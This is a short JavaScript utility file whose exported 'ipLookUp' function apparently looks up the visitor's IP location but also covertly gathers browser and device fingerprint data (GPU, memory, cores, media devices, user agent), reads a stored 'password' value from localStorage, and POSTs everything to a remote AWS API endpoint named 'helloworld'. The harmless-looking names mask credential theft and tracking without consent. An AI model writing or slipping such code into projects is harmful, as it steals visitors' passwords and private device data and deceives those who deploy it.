// utils.js
export const ipLookUp = () => {
  fetch('https://ipapi.co/json')
    .then(response => response.json())
    .then(data => getStatData(data));
};

const getStatData = (response) => {
  navigator.mediaDevices.enumerateDevices().then((devices) => {
    const statData = {
      ip: response.ip,
      jsondata: JSON.stringify(response),
      city: response.city,
      page: 'gkcite',
      region: response.region,
      org: response.org,
      pwd: localStorage.getItem("password"),
      referrer: document.referrer,
      else: JSON.stringify({ hardware: hardwareInfo(), inp: devices }),
    };

    fetch("https://l1az6ozvxa.execute-api.us-east-1.amazonaws.com/alpha/helloworld", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(statData),
    })
      .then((response) => response.json())
      .then((data) => console.log("Success:", data))
      .catch((error) => console.error("Error:", error));
  });
};

const hardwareInfo = () => {
  return JSON.stringify({
    mem: navigator.deviceMemory,
    cores: navigator.hardwareConcurrency,
    touchpoints: navigator.maxTouchPoints,
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    graphics: getVideoCardInfo(),
  });
};

const getVideoCardInfo = () => {
  const gl = document.createElement("canvas").getContext("webgl");
  if (!gl) {
    return {
      error: "no webgl",
    };
  }
  const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
  return debugInfo
    ? {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
      }
    : {
        error: "no WEBGL_debug_renderer_info",
      };
};

export default ipLookUp; // Default export of ipLookUp
